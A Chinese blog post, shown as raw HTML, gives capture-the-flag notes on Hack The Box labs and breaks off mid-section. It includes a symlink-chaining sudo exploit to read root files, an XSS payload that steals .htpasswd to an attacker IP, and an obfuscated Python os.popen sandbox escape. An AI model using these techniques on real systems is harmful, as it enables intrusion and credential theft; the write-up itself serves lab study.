@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HTB Alert&amp;LinkVortex&amp;code - Zsm Blog</title><meta name="Description" content="Zsm Blog,crypto,ctf,nodejs,wp,密码学"><meta property="og:url" content="https://www.zhuangsanmeng.xyz/htb-alert_and_linkvortex_and_code/">
+  <meta property="og:site_name" content="Zsm Blog">
+  <meta property="og:title" content="HTB Alert&LinkVortex&code">
+  <meta property="og:description" content="靶场链接 https://app.hackthebox.com/machines/Alert https://app.hackthebox.com/machines/LinkVortex code是本周靶机哎
+笔记 HTB的靶场质量都很高，不想像其他的一样写很多没用的东西，主要写学到的东西和靶机概况
+whatweb 可以自动分析网站的响应并识别出使用的Web框架、CMS、服务器、JavaScript库等技术组件， 一般情况下whatweb -v输出的比较详细，而且好看， WhatWeb 有 4 种扫描级别，通过数字 1~4 选择，默认为1：">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-24T23:11:20+08:00">
+    <meta property="article:modified_time" content="2025-03-24T23:11:20+08:00">
+    <meta property="article:tag" content="渗透">
+    <meta property="og:image" content="https://www.zhuangsanmeng.xyz/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.zhuangsanmeng.xyz/">
+  <meta name="twitter:title" content="HTB Alert&LinkVortex&code">
+  <meta name="twitter:description" content="靶场链接 https://app.hackthebox.com/machines/Alert https://app.hackthebox.com/machines/LinkVortex code是本周靶机哎
+笔记 HTB的靶场质量都很高，不想像其他的一样写很多没用的东西，主要写学到的东西和靶机概况
+whatweb 可以自动分析网站的响应并识别出使用的Web框架、CMS、服务器、JavaScript库等技术组件， 一般情况下whatweb -v输出的比较详细，而且好看， WhatWeb 有 4 种扫描级别，通过数字 1~4 选择，默认为1：">
+<meta name="application-name" content="Zsm blog">
+<meta name="apple-mobile-web-app-title" content="Zsm blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.zhuangsanmeng.xyz/htb-alert_and_linkvortex_and_code/" /><link rel="prev" href="https://www.zhuangsanmeng.xyz/2025polarctf/" /><link rel="next" href="https://www.zhuangsanmeng.xyz/study_nodejs1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HTB Alert\u0026LinkVortex\u0026code",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.zhuangsanmeng.xyz\/htb-alert_and_linkvortex_and_code\/"
+        },"genre": "posts","keywords": "渗透","wordcount":  1878 ,
+        "url": "https:\/\/www.zhuangsanmeng.xyz\/htb-alert_and_linkvortex_and_code\/","datePublished": "2025-03-24T23:11:20+08:00","dateModified": "2025-03-24T23:11:20+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Zsm"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/" title="About"> 关于 </a><a class="menu-item" href="/friend/" title="Friend"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="About">关于</a><a class="menu-item" href="/friend/" title="Friend">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+    <h2 class="toc-title">Contents</h2>
+    <div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HTB Alert&LinkVortex&code</h1><div class="post-meta">
+        <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Zsm</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i>靶场</a></span></div>
+        <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-24">2025-03-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1878 words&nbsp;
+            <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;<span id="/htb-alert_and_linkvortex_and_code/" class="leancloud_visitors" data-flag-title="HTB Alert&amp;LinkVortex&amp;code">
+                <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span
+                    class=leancloud-visitors-count></span>&nbsp;views
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="">
+        <div class="details-summary toc-title">
+            <span>Contents</span>
+            <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#靶场链接">靶场链接</a></li>
+    <li><a href="#笔记">笔记</a>
+      <ul>
+        <li><a href="#whatweb">whatweb</a></li>
+        <li><a href="#git-dumper">git-dumper</a></li>
+        <li><a href="#linkvortex提权">LinkVortex提权</a></li>
+        <li><a href="#xss外带文件">XSS外带文件</a></li>
+        <li><a href="#端口转发">端口转发</a></li>
+        <li><a href="#code的模拟输出">code的模拟输出</a></li>
+        <li><a href="#code的roottxt">code的root.txt</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><div class="content" id="content"><h2 id="靶场链接">靶场链接</h2>
+<p><a href="https://app.hackthebox.com/machines/Alert" target="_blank" rel="noopener noreffer ">https://app.hackthebox.com/machines/Alert</a>
+<a href="https://app.hackthebox.com/machines/LinkVortex" target="_blank" rel="noopener noreffer ">https://app.hackthebox.com/machines/LinkVortex</a>
+code是本周靶机哎</p>
+<h2 id="笔记">笔记</h2>
+<p>HTB的靶场质量都很高，不想像其他的一样写很多没用的东西，主要写学到的东西和靶机概况</p>
+<h3 id="whatweb">whatweb</h3>
+<p>可以自动分析网站的响应并识别出使用的Web框架、CMS、服务器、JavaScript库等技术组件，
+一般情况下<code>whatweb -v</code>输出的比较详细，而且好看，
+WhatWeb 有 4 种扫描级别，通过数字 1~4 选择，默认为1：</p>
+<ol>
+<li>stealthy 每个目标发送一次http请求，并且会跟随重定向</li>
+<li>unused 不可用（从2011年开始，此参数就是在开发状态）</li>
+<li>aggressive 每个目标发送少量的http请求，这些请求时根据参数为1时结果确定的</li>
+<li>heavy 每个目标会发送大量的http请求，会去尝试每一个插件
+<code>whatweb -v -a 等级 域名</code>。</li>
+</ol>
+<h3 id="git-dumper">git-dumper</h3>
+<p>类似githack，都可以用</p>
+<h3 id="linkvortex提权">LinkVortex提权</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bob@linkvortex:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for bob on linkvortex:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User bob may run the following commands on linkvortex:
+</span></span><span class="line"><span class="cl">    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看看这个<code>.sh</code>文件是什么</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">QUAR_DIR</span><span class="o">=</span><span class="s2">&#34;/var/quarantined&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -z <span class="nv">$CHECK_CONTENT</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">CHECK_CONTENT</span><span class="o">=</span><span class="nb">false</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">LINK</span><span class="o">=</span><span class="nv">$1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$LINK</span><span class="s2">&#34;</span> <span class="o">=</span>~ <span class="se">\.</span>png$ <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/echo <span class="s2">&#34;! First argument must be a png file !&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">exit</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> /usr/bin/sudo /usr/bin/test -L <span class="nv">$LINK</span><span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">LINK_NAME</span><span class="o">=</span><span class="k">$(</span>/usr/bin/basename <span class="nv">$LINK</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">LINK_TARGET</span><span class="o">=</span><span class="k">$(</span>/usr/bin/readlink <span class="nv">$LINK</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> /usr/bin/echo <span class="s2">&#34;</span><span class="nv">$LINK_TARGET</span><span class="s2">&#34;</span> <span class="p">|</span> /usr/bin/grep -Eq <span class="s1">&#39;(etc|root)&#39;</span><span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;! Trying to read critical files, removing link [ </span><span class="nv">$LINK</span><span class="s2"> ] !&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/unlink <span class="nv">$LINK</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;Link found [ </span><span class="nv">$LINK</span><span class="s2"> ] , moving it to quarantine&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/mv <span class="nv">$LINK</span> <span class="nv">$QUAR_DIR</span>/
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nv">$CHECK_CONTENT</span><span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl">      /usr/bin/echo <span class="s2">&#34;Content:&#34;</span>
+</span></span><span class="line"><span class="cl">      /usr/bin/cat <span class="nv">$QUAR_DIR</span>/<span class="nv">$LINK_NAME</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>脚本设计用于检查一个文件（作为参数传递）是否是一个指向 PNG 文件的符号链接。如果是，它会检查符号链接的目标，并决定是删除它还是将其隔离。具体来说，如果符号链接指向敏感文件或目录（如 /etc 或 /root ），则会删除链接。否则，它将在指定的目录（/var/quarantined）中隔离链接。如果将 <code>CHECK_CONTENT</code> 变量设置为 true ，它还可能打印隔离文件的內容。</p>
+<p>首先我们的思路就是读取root的flag，我们可以把这个<code>.txt</code>链接到<code>.png</code>上，但是直接链接会报错，我们在中间再转折一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">bob</span><span class="err">@</span><span class="n">linkvortex</span><span class="p">:</span><span class="o">~$</span> <span class="k">export</span> <span class="n">CHECK_CONTENT</span><span class="o">=</span><span class="bp">true</span>
+</span></span><span class="line"><span class="cl"><span class="n">bob</span><span class="err">@</span><span class="n">linkvortex</span><span class="p">:</span><span class="o">~$</span> <span class="n">touch</span> <span class="n">link1</span><span class="o">.</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="n">bob</span><span class="err">@</span><span class="n">linkvortex</span><span class="p">:</span><span class="o">~$</span> <span class="err">`</span><span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="o">.</span><span class="n">txt</span> <span class="n">link1</span><span class="o">.</span><span class="n">png</span><span class="err">`</span>
+</span></span><span class="line"><span class="cl"><span class="n">bob</span><span class="err">@</span><span class="n">linkvortex</span><span class="p">:</span><span class="o">~$</span> <span class="n">touch</span> <span class="n">link2</span><span class="o">.</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="n">bob</span><span class="err">@</span><span class="n">linkvortex</span><span class="p">:</span><span class="o">~$</span> <span class="err">`</span><span class="n">ln</span> <span class="o">-</span><span class="n">sf</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bob</span><span class="o">/</span><span class="n">link1</span><span class="o">.</span><span class="n">png</span> <span class="n">link2</span><span class="o">.</span><span class="n">png</span><span class="err">`</span>
+</span></span><span class="line"><span class="cl"><span class="n">bob</span><span class="err">@</span><span class="n">linkvortex</span><span class="p">:</span><span class="o">~$</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">link1</span><span class="o">.</span><span class="n">png</span>  <span class="n">link2</span><span class="o">.</span><span class="n">png</span>  <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">bob</span><span class="err">@</span><span class="n">linkvortex</span><span class="p">:</span><span class="o">~$</span> <span class="n">sudo</span> <span class="n">bash</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">ghost</span><span class="o">/</span><span class="n">clean_symlink</span><span class="o">.</span><span class="n">sh</span> <span class="n">link2</span><span class="o">.</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="n">Link</span> <span class="n">found</span> <span class="p">[</span> <span class="n">link2</span><span class="o">.</span><span class="n">png</span> <span class="p">]</span> <span class="p">,</span> <span class="n">moving</span> <span class="n">it</span> <span class="n">to</span> <span class="n">quarantine</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">a2340eed30a7a15b1fb810a7945d2338</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>实际上这个就是个任意文件读取，我们当然可以去读取ssh的密钥去做到提权的效果</p>
+<h3 id="xss外带文件">XSS外带文件</h3>
+<blockquote>
+<p>写这个就想起了ccb线下赛的XSS外带cookie，虽然不是web手，但是想起来这个没做出来就很难受，害</p></blockquote>
+<p>看看网页源代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html lang=&#34;en&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;link rel=&#34;stylesheet&#34; href=&#34;css/style.css&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Alert - Markdown Viewer&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;nav&gt;
+</span></span><span class="line"><span class="cl">        &lt;a href=&#34;index.php?page=alert&#34;&gt;Markdown Viewer&lt;/a&gt;
+</span></span><span class="line"><span class="cl">        &lt;a href=&#34;index.php?page=contact&#34;&gt;Contact Us&lt;/a&gt;
+</span></span><span class="line"><span class="cl">        &lt;a href=&#34;index.php?page=about&#34;&gt;About Us&lt;/a&gt;
+</span></span><span class="line"><span class="cl">        &lt;a href=&#34;index.php?page=donate&#34;&gt;Donate&lt;/a&gt;
+</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
+</span></span><span class="line"><span class="cl">    &lt;div class=&#34;container&#34;&gt;
+</span></span><span class="line"><span class="cl">        &lt;h1&gt;Markdown Viewer&lt;/h1&gt;&lt;div class=&#34;form-container&#34;&gt;
+</span></span><span class="line"><span class="cl">            &lt;form action=&#34;visualizer.php&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span></span><span class="line"><span class="cl">                &lt;input type=&#34;file&#34; name=&#34;file&#34; accept=&#34;.md&#34; required&gt;
+</span></span><span class="line"><span class="cl">                &lt;input type=&#34;submit&#34; value=&#34;View Markdown&#34;&gt;
+</span></span><span class="line"><span class="cl">            &lt;/form&gt;
+</span></span><span class="line"><span class="cl">          &lt;/div&gt;    &lt;/div&gt;
+</span></span><span class="line"><span class="cl">    &lt;footer&gt;
+</span></span><span class="line"><span class="cl">        &lt;p style=&#34;color: black;&#34;&gt;© 2024 Alert. All rights reserved.&lt;/p&gt;
+</span></span><span class="line"><span class="cl">    &lt;/footer&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现<code>md</code>文件写的东西都会在这里显现，典型的XSS漏洞.
+突然想起来服务是Apache，那么就有<code>.htpasswd</code>用来存放密码，那么我们的思路就是去外带这个文件，去得到账号的密码，伟大的grok3会给我payload的
+本地先开python的http服务(ccb的那个五分钟刷新一次不应该关的啊啊啊)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fetch</span><span class="p">(</span><span class="s2">&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">response</span> <span class="o">=&gt;</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">  <span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fetch</span><span class="p">(</span><span class="s2">&#34;http://10.10.16.5:80/?file_content=&#34;</span> <span class="o">+</span> <span class="n">encodeURIComponent</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>连接输入到<code>Contact Us</code>，本地接收到<code>%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A</code> ，后面爆破就行了</p>
+<h3 id="端口转发">端口转发</h3>
+<p>假设ssh进入一个靶机，<code>ps</code>发现还有端口在运行，但是<code>nmap</code>并没有发现，就可以尝试把端口转发出去，例如
+<code>ssh -L 8080:127.0.0.1:8080 albert@alert.htb</code>，一般漏洞点在这个web里面</p>
+<h3 id="code的模拟输出">code的模拟输出</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">modules = globals().values()
+</span></span><span class="line"><span class="cl">global _module
+</span></span><span class="line"><span class="cl">for name, module in sys.modules.items():
+</span></span><span class="line"><span class="cl">    if name == (&#39;o&#39;+&#39;s&#39;):
+</span></span><span class="line"><span class="cl">        _module = module
+</span></span><span class="line"><span class="cl">        break
+</span></span><span class="line"><span class="cl">_method = getattr(_module, &#39;po&#39; + &#39;pen&#39;)
+</span></span><span class="line"><span class="cl">file_obj = _method(&#39; &#39;)
+</span></span><span class="line"><span class="cl">_method = getattr(file_obj, &#39;re&#39; + &#39;ad&#39;)
+</span></span><span class="line"><span class="cl">output = _method()
+</span></span><span class="line"><span class="cl">print(output)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实本质是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">output = os.popen(&#39; &#39;).read()
+</span></span><span class="line"><span class="cl">print(output)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在题目禁用的乱七八糟的情况下也是一个好方法，可以直接去读flag，爽啦</p>
+<h3 id="code的roottxt">code的root.txt</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
